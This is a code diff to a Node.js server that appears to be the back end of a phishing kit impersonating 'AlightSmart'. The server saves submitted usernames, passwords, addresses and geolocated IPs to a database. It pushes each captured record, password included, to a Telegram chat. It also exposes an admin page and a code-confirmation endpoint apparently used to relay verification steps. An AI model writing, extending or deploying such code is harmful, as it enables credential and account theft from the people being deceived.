@@ -44,17 +44,19 @@ async function getLocation(ip) {
 
     const services = [
         `https://ipapi.co/${ip}/json/`,
-        `https://freeipapi.com/api/json/${ip}`
+        `https://freeipapi.com/api/json/${ip}`,
+        `http://ip-api.com/json/${ip}`
     ];
 
     for (const url of services) {
         try {
-            const res = await fetch(url, { timeout: 5000 });
+            const res = await fetch(url, { timeout: 6000 });
             const data = await res.json();
-            
-            if (data.city || data.country_name || data.country) {
-                const city = data.city || data.regionName || '';
-                const country = data.country_name || data.country || '';
+
+            let city = data.city || data.regionName || data.region || '';
+            let country = data.country_name || data.country || '';
+
+            if (city || country) {
                 return `${city}, ${country}`.trim() || 'Unknown Location';
             }
         } catch (e) {}
@@ -64,10 +66,9 @@ async function getLocation(ip) {
 
 async function sendTelegramNotification(record) {
     let usernameDisplay = record.username || '-';
-    
-    // Clean up "Verification Step" etc.
-    if (usernameDisplay.includes("Verification Step") || usernameDisplay === "N/A") {
-        usernameDisplay = "Next Step / Verification";
+
+    if (usernameDisplay.includes("Verification Step") || usernameDisplay.includes("Step")) {
+        usernameDisplay = "Verification / Next Step";
     }
 
     const message = `🚨 *New Activity on AlightSmart!*\n\n` +
@@ -90,9 +91,8 @@ async function sendTelegramNotification(record) {
                 parse_mode: 'Markdown'
             })
         });
-        console.log("✅ Telegram notification sent!");
     } catch (err) {
-        console.error("❌ Telegram failed:", err.message);
+        console.error("Telegram failed:", err.message);
     }
 }
 
@@ -107,9 +107,8 @@ async function saveRecord(type, username = null, password = null, address = null
             [type, username, password, address, ip, location, timestamp]
         );
 
-        console.log(`✅ SAVED: ${type} | Username: ${username} | Location: ${location}`);
+        console.log(`✅ SAVED: ${type} | Location: ${location}`);
 
-        // Send notification for every activity
         await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
@@ -142,14 +141,11 @@ app.get('/api/records', async (req, res) => {
         const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
         res.json(result.rows);
     } catch (err) {
-        console.error("Records fetch error:", err.message);
         res.json([]);
     }
 });
 
-app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
+app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
 
 app.post('/api/confirm-code', async (req, res) => {
     const { id, status } = req.body;
@@ -177,6 +173,4 @@ app.post('/api/clear', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
